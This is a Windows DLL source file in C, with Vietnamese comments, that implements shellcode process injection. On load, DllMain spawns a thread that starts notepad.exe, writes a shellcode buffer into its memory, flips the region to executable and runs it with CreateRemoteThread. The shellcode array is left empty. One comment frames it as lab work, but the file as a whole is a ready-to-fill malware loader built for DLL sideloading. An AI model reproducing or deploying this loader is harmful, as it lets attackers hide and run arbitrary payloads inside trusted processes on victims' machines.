#include <windows.h>

unsigned char sc[] = "";

DWORD WINAPI LaunchAndInject(LPVOID lpParam) {
    // 1. Khởi tạo các cấu trúc dữ liệu cần thiết cho việc tạo tiến trình
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };

    // Đường dẫn đến ứng dụng mục tiêu trong System32
    wchar_t cmd[] = L"C:\\Windows\\System32\\notepad.exe";

    // 2. Tạo tiến trình mới 
    // Trong môi trường Lab, ta có thể dùng cờ CREATE_NO_WINDOW nếu không muốn hiện cửa sổ Notepad,
    // hoặc để mặc định (0) để dễ quan sát bằng mắt thường xem tiến trình có bị sập hay không.
    BOOL success = CreateProcessW(
        NULL,           // Ứng dụng cụ thể
        cmd,            // Dòng lệnh thực thi
        NULL,           // Thuộc tính bảo mật tiến trình
        NULL,           // Thuộc tính bảo mật luồng
        FALSE,          // Không kế thừa các Handle từ tiến trình cha
        0,              // Cờ tạo tiến trình (0 = chạy bình thường)
        NULL,           // Sử dụng môi trường của tiến trình cha
        NULL,           // Thư mục làm việc mặc định
        &si,            // Cấu hình Startup Info
        &pi             // Nhận thông tin Process ID và Handles trả về từ hệ thống
    );

    if (!success) return 1; // Không thể khởi chạy Notepad

    // 3. Cấp phát bộ nhớ từ xa trên tiến trình vừa tạo với quyền Đọc/Ghi
    void* remoteBuffer = VirtualAllocEx(pi.hProcess, NULL, sizeof(sc), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remoteBuffer) {
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return 1;
    }

    // 4. Ghi dữ liệu Shellcode sang tiến trình Notepad mới
    SIZE_T bytesWritten;
    if (!WriteProcessMemory(pi.hProcess, remoteBuffer, sc, sizeof(sc), &bytesWritten)) {
        VirtualFreeEx(pi.hProcess, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return 1;
    }

    // 5. Thay đổi thuộc tính vùng nhớ sang Chỉ đọc/Thực thi (RX) nhằm tuân thủ chuẩn W^X
    DWORD oldProtect;
    if (!VirtualProtectEx(pi.hProcess, remoteBuffer, sizeof(sc), PAGE_EXECUTE_READ, &oldProtect)) {
        VirtualFreeEx(pi.hProcess, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return 1;
    }

    // 6. Tạo luồng từ xa để thực thi Shellcode
    HANDLE hRemoteThread = CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
    
    if (hRemoteThread) {
        // Đóng các Handle không còn sử dụng để tránh rò rỉ tài nguyên hệ thống (Memory Leak)
        CloseHandle(hRemoteThread);
    }

    // Đóng các Handle của tiến trình cha/luồng chính của Notepad
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    switch (reason) {
        case DLL_PROCESS_ATTACH:
            DisableThreadLibraryCalls(hModule);
            // Kích hoạt luồng xử lý độc lập để DllMain giải phóng ngay lập tức
            HANDLE hThread = CreateThread(NULL, 0, LaunchAndInject, NULL, 0, NULL);
            if (hThread) CloseHandle(hThread);
            break;
    }
    return TRUE;
}
